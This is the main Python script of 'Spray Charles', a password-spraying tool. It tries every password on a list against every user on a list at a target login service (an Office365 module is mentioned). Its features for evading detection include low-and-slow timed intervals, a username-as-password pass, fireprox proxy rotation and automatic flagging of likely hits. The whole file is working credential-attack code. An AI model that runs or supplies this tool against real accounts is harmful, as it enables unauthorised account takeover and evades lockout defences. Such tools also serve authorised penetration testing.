#!/usr/bin/env python3

import numpy
import time
import argparse
import datetime
import json
import os
import sys
import csv
from targets import *
import logging
import analyze
from requests import ConnectTimeout, ConnectionError, ReadTimeout
from time import sleep
        
# initalize colors object
colors = analyze.Color()

def args():
    parser = argparse.ArgumentParser(description="low and slow password spraying tool", formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-p", "--passwords", type=str, dest="passlist", help="filepath of the passwords list", default="./passwords.txt", required=False)
    parser.add_argument("-H", "--host", type=str, dest="host", help="host to password spray (ip or hostname). Can by anything when using Office365 module - only used for logfile name.", required=True)
    parser.add_argument("-m", "--module", type=str, dest="module", help="module corresponding to target host", required=True)
    parser.add_argument("-o", "--output", type=str, dest="csvfile", help="name and path of output csv where attempts will be logged", required=True)
    parser.add_argument("-u", "--usernames", type=str, dest="userlist", help="filepath of the usernames list", required=True)
    parser.add_argument("-a", "--attempts", type=int, dest="attempts", help="number of logins submissions per interval (for each user)", required=False)
    parser.add_argument("-i", "--interval", type=int, dest="interval", help="minutes inbetween login intervals", required=False)
    parser.add_argument("-e", "--equal", action="store_true", dest="equal", help="does 1 spray for each user where password = username", required=False)
    parser.add_argument("-t", "--timeout", type=int, dest="timeout", help="web request timeout threshold. default is 5 seconds", default=5, required=False)
    parser.add_argument("-b", "--port", type=int, dest="port", help="port to connect to on the specified host. Default 443.", default=443, required=False)
    parser.add_argument("-f", "--fireprox", type=str, dest="fireprox", help="the url of the fireprox interface, if you are using fireprox.", default="", required=False)

    args = parser.parse_args()
    userlist, passlist, attempts, interval = args.userlist, args.passlist, args.attempts, args.interval

    # get usernames from file
    try:
        with open(userlist, 'r') as f:
            users = f.read().splitlines()
    except Exception:
        colors.color_print('[!] Error reading usernames from file: %s' % (userlist), colors.red)
        exit()

    #  get passwords from file
    try:
        with open(passlist, 'r') as f:
            passwords = f.read().splitlines()
    except Exception:
        colors.color_print('[!] Error reading passwords from file: %s' % (passlist), colors.red)
        exit()


    if interval and not attempts:
        colors.color_print('[!] Number of login attempts per interval (-a) required with -i', colors.red)
        exit()
    elif not interval and attempts:
        colors.color_print('[!] Minutes per interval (-i) required with -a', colors.red)
        exit()

    return users, passwords, args.host, args.csvfile, attempts, interval, args.equal, args.module, args.timeout, args.port, args.fireprox


def check_sleep(login_attempts, attempts, interval):
    if login_attempts == attempts:
        print('')
        colors.color_print(('[*] Sleeping until %s') % ((datetime.datetime.now() + datetime.timedelta(minutes=interval)).strftime('%m-%d %H:%M:%S')), colors.yellow)
        time.sleep(interval * 60)
        print('')
        return 0
    else:
        return login_attempts


def print_attempt(username, password, response, csvfile):
    if response == 'timeout':
        code = 'TIMEOUT'
        length = 'TIMEOUT'
    else:
        code = response.status_code
        length = str(len(response.content))
    print('%-27s %-17s %13s %15s' % (username, password, code, length))
    output = open(csvfile, 'a')
    output.write('%s,%s,%s,%s\n' % (username, password, code, length))
    output.close() 


def print_header():
    print('%-27s %-17s %-13s %-15s' % ('Username','Password','Response Code','Response Length'))
    print('-' * 75)


def login(target, username, password, csvfile):
    try:
        response = target.login(username, password)
        print_attempt(username, password, response, csvfile)
    except (ConnectTimeout, ReadTimeout) as e:
        #colors.color_print('[!] Request to host timed out. Check connection to host - exiting', colors.red)
        print_attempt(username, password, 'timeout', csvfile)
    except ConnectionError as e:
        colors.color_print('\n[!] Connection error - sleeping for 5 seconds', colors.red)
        sleep(5)
        login(target, username, password, csvfile)


def ascii():
    print(f'''{colors.grey}
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █░░░░░░░░▀█▄▀▄▀██████░▀█▄▀▄▀██████                                    
    ░░░░ ░░░░░░░▀█▄█▄███▀░░░ ▀█▄█▄███

               Spray Charles
    
    {colors.end}''')


def main():
    users, passwords, host, csvfile, attempts, interval, equal, module, timeout, port, fireprox = args()
    # try to instantiate the specified module
    try:
        module = module.title()
        mod_name = getattr(sys.modules[__name__], module)
        class_name = getattr(mod_name, module)
        target = class_name(host, port, timeout, fireprox)
    except AttributeError:
        print(f'[!] Error loading {module} module. {module} is spelled incorrectly or does not exist')
        exit()

    # create the log file
    if not os.path.isdir('logs'):
        os.mkdir('logs')
    log_name = 'logs/%s.log' % host
    logging.basicConfig(filename=log_name, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    ascii()

    output = open(csvfile, 'w')
    fieldnames = ['Username','Password','Response Code','Response Length']
    output_writer = csv.DictWriter(output, delimiter=',', fieldnames=fieldnames)
    output_writer.writeheader()
    output.close()

    colors.color_print('[*] Target Module: ', colors.blue, '')
    print(module)

    colors.color_print('[*] Spraying URL: ', colors.blue, '')
    print(target.url)

    if attempts:
        colors.color_print('[*] Interval: ', colors.blue, '')
        print('Attempting %d login(s) per user every %d minutes' % (attempts, interval))
        
    colors.color_print('[*] Log of event times: ', colors.blue, '')
    print(log_name)

    colors.color_print('[*] Log of spray results: ', colors.blue, '')
    print(csvfile)

    print('')
    input('Press enter to begin:')
    print('')
    print_header()

    login_attempts = 0

    # spray once with password = username if flag present
    if equal:
        for username in users:
            pword = username.split('@')[0]
            login(target, username, pword, csvfile)
            
            # log the login attempt
            logging.info('Login attempted as %s' % username)

        login_attempts += 1

    # spray using password file
    for password in passwords:
        login_attempts = check_sleep(login_attempts, attempts, interval)
        for username in users:
            login(target, username, password, csvfile)
            
            # log the login attempt
            logging.info('Login attempted as %s' % username)
            
        login_attempts += 1

    # close files
    output.close()
    
    # analyze the results to point out possible hits 
    analyzer = analyze.Analyzer(csvfile)
    analyzer.analyze()
    

# stock boilerplate
if __name__ == '__main__':
    main()
